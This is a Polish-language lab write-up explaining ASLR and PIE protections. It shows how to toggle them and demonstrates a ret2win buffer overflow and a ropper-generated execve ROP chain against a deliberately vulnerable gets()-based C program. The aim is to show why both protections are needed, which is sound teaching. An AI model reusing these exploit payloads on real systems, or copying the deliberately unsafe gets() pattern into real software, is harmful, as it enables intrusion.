# ASLR & PIE
## Opis
### PIE
PIE czyli `position-independent executable` to kod który po skompilowaniu może funkcjonować w dowolnym obszarze pamięci bazując na offsetach od początkowego adresu.

W przypadku kompilacji bez PIE:

![](https://i.imgur.com/vARS95y.png)

W przypadku kompilacji z PIE:

![](https://i.imgur.com/LwlXBhY.png)

Do działania tak skompilowanego kodu niezbędna jest GOT - `Global Offset Table`, przechowująca mapująca symbole na adresy w pamięci. Dynamiczny linker uzupełnia GOT przy uruchomieniu programu lub przy pierwszym odwołaniu do funkcji.

PIE ma też spory wpływ na performance systemu Linux. Na architekturze x86-32bit ubuntu wskazuje na około 5-10%.

Windows w przeciwieństwie do linuxa nie używa PIE. Jego miejsce zastępują PE - Portable Executable. Zawięrają one zazwyczaj kod skompilowany pod preferowany bazowy adres. Windows może przy ładowaniu przenieść (rebase) program pod dowolny adres przeliczając wszystkie adresy w pliku na nowe. W wyniku tej operacji system potrzebuję większej ilości pamięci, ale wpływ na czas wykonania jest znikomy.

### ASLR
ASLR czyli `Address space layout randomization` - to technika uniemożliwiająca skuteczne skakanie do danych sekcji pamięci. Osiąga to poprzez randomizacje przestrzeni adresów naszego kodu. 

W przypadku wyłączonego ASLR program będzie uruchamiał się w tej samej przestrzeni adresowej:

![](https://i.imgur.com/5NnJLGX.png)

W przypadku użycia ASLR program załaduje się do losowej przestrzeni adresowej przy każdym uruchomieniu:

(w gdb ASLR należy włączyć komendą `set disable-randomization off`)

![](https://i.imgur.com/jIIs0Sc.png)

![](https://i.imgur.com/u1N4QOP.png)

ASLR najlepiej stosować razem z PIE. W przeciwnym wypadku kod naszej aplikacji jest ładowany statycznie. Z tego powodu ASLR + PIE ma znaczący wpływ na wydajność na Linuxie. Jest on też opcją kontrolowaną flagą systemową dla wszystkich programów.

Na windowsie ASLR nie ma wpływu na wydajność. Opcja `/DYNAMICBASE` modyfikuje nagłówek executable aby wskazać czy aplikacja powinna być rebase'owana przy ładowaniu.

## Clang i GCC
### ASLR
Jest niezależny od kompilacji - można go włączyć lub wyłączyć w każdym momencie zmieniając flagę systemową komendami: 

Wyłączenie aslr: `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`
Włączenie aslr: `echo 2 | sudo tee /proc/sys/kernel/randomize_va_space`

### PIE

W obydu kompilatorach PIE jest defaultowo włączone. W obydu kompilatorach możemy wyłączyć je przez flagę `-no-pie`.

Wartym zauważenia wyjątkiem jest kompilacja statyczna z włączonym PIE. Wykorzystując flagę `-static-pie` możemy utwożyć pie executable nie wymagające dynamicznego linkera. Niezbędna do tego jest kompilacja wszystkich linkowanych plików z flagą `-fpie`.

## Exploit 1
### Podatna aplikacja
```c
#include <stdio.h>
#include <stdlib.h>

void win() { system("/bin/sh"); }

void func() {
  char input[16];

  printf("Please enter your name: \n");
  gets(input);

  printf("Hi %s\n", input);
}

int main() {
  func();
  return 0;
}

```

W exploicie wykożystuje użycie niebezpiecznej funkcji `gets()` pozwalającej na `BOF` oraz funkcji `win()` dającej dostęp do shella.

Do automatyzacji exploitu wykorzystuje `pwntools`.

### Exploitacja

Za pomocą gdb szukam adresu funkcji win:

![](https://i.imgur.com/4ZZqMyp.png)

Adres ten zamieniam na little endian funkcją `p32` i dodaje do payloadu po offsecie:

```{python}
payload = b"a"*eip_offset
payload += p32(0x08049192)
```

Przy wyłączonym PIE + ASLR exploit działa:

![](https://i.imgur.com/N6K7LO3.png)

Przy włączonym PIE + ASLR exploit nie działa:

![](https://i.imgur.com/fmk9nLI.png)

Exploit nie może zadziałać ponieważ funkcja `win()` została załadowana pod losowy adres.

Ważne że przy włączeniu samego pie exploit również zadziała ale z innym adresem.

## Exploit 3 - ROP

Popularną techniką jest ROP - Return Oriented Programming. Polega ona na wykorzystaniu kodu załadowanego do pamięci. Instrukcje zawarte w payloadzie nazywane są `Gadgetami` i kończą się instrukcją `ret`. Za pomocą gadgetów możemy utwożyć łańcuch który ustawi odpowiednio rejestry i wywoła syscalla `execve` dającego nam dostęp do basha.

### Exploitacja
Aby utworzyć ROPchain potrzebujemy najpierw odnaleźć w kodzie aplikacji jak najwięcej gadgetów. Przy dużych i skomplikowanych aplikacjach z dużą ilością kodu naturalnie występuje duża ilość dostępnych gadżetów. Aby osiągnąć podobny efekt kompiluje aplikacje ze statycznie linkowanymi biliotekami.

Do znalezienia gadgetów można wykorzystać narzędzia takie jak `ropper lub ROPgadget`, moim wyborem jest ropper:

`ropper -f app1-static.o -b 0a --search "ret"
`

![](https://i.imgur.com/eS3sRxr.png)

Ropper znalazł gadgety z instrukcją ret. Dalej albo ręcznie albo w sposób zautomatyzowany sklejamy chain z odnalezionych gadgetów:

`ropper -f app1-static.o -b 0a --chain execve`

```python
rop += rebase_0(0x00001743) # 0x08049743: pop edi; ret; 
rop += '//bi'
rop += rebase_0(0x0000101e) # 0x0804901e: pop ebx; ret; 
rop += rebase_0(0x0009e060)
rop += rebase_0(0x000475fd) # 0x0808f5fd: mov dword ptr [ebx], edi; pop ebx; pop esi; pop edi; ret; 
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += rebase_0(0x00001743) # 0x08049743: pop edi; ret; 
rop += 'n/sh'
rop += rebase_0(0x0000101e) # 0x0804901e: pop ebx; ret; 
rop += rebase_0(0x0009e064)
rop += rebase_0(0x000475fd) # 0x0808f5fd: mov dword ptr [ebx], edi; pop ebx; pop esi; pop edi; ret; 
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += rebase_0(0x00001743) # 0x08049743: pop edi; ret; 
rop += p(0x00000000)
rop += rebase_0(0x0000101e) # 0x0804901e: pop ebx; ret; 
rop += rebase_0(0x0009e068)
rop += rebase_0(0x000475fd) # 0x0808f5fd: mov dword ptr [ebx], edi; pop ebx; pop esi; pop edi; ret; 
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += p(0xdeadbeef)
rop += rebase_0(0x0000101e) # 0x0804901e: pop ebx; ret; 
rop += rebase_0(0x0009e060)
rop += rebase_0(0x0001bd11) # 0x08063d11: pop ecx; add al, 0xf6; ret; 
rop += rebase_0(0x0009e068)
rop += rebase_0(0x00050d45) # 0x08098d45: pop edx; xor eax, eax; pop edi; ret; 
rop += rebase_0(0x0009e068)
rop += p(0xdeadbeef)
rop += rebase_0(0x00001825) # 0x08049825: pop ebp; ret; 
rop += p(0x0000000b)
rop += rebase_0(0x0001bb9b) # 0x08063b9b: xchg eax, ebp; ret; 
rop += rebase_0(0x00032170) # 0x0807a170: int 0x80; ret; 
```

Flaga `-b 0a` zapewnia że w adresach gadgetów nie pojawią się bajty `\x0a` - `\n` kończące działanie funkcji `gets()`. W przypadku exploitowania innej funkcji należy odfiltrować odpowiednie wartości.

Tak przygotowany chain wysyłamy po odpowiednio ustalonym offsecie:

![](https://i.imgur.com/yKSGFNX.png)

W przypadku użycia PIE, ASLR i linkowania dynamicznego exploit ten staje się niemożliwy do wykonania bez leakowania adresu bazowego.

## Wnioski

ASLR i PIE powinny być używane jednocześnie. ASLR nie może spełnić swojej funkcji jeżeli kod był kompilowany bez PIE, a samo PIE nie daje ochrony wystarczającej do usprawiedliwienia zmiejszenia performance'u.
